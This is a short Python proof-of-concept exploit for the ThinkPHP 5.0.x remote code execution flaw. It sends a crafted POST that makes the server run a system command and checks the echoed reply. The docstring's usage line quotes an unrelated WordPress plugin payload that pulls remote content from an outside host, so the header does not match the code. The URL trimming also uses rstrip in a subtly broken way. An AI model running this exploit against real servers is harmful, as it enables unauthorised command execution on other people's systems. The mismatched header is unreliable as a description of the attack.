#!/usr/bin/env python		
#coding:utf-8

"""
ThinkPHP5 <=5.0.23 远程代码执行漏洞

Desc:
	2019年1月11日，360CERT发现某安全社区出现关于ThinkPHP5 RCE漏洞的威胁情报，不久之后ThinkPHP5官方与GitHub发布更新。

Version
	ThinkPHP 5.0.x ~ 5.0.23
Usage:
	1. python POC-S.py -s 
	2. POC: /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://lj.s7star.cn/info.txt
Referer
	https://www.seebug.org/vuldb/ssvid-9771
"""


import requests

def poc(url):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/').rstrip('/index.php')
    data = {
    	"_method": "__construct",
    	"filter[]": "system",
    	"method": "get",
    	"server[REQUEST_METHOD]": "echo rivirsir"
    }
    vulnurl = url + "/index.php?s=captcha"
    try:
        res = requests.post(vulnurl, data=data, timeout=10)
        if res.text.startswith("rivirsir"):
            return True
    except Exception as e:
        return False
    return False


if __name__ == "__main__":
    print poc("http://vuln.com:8080/")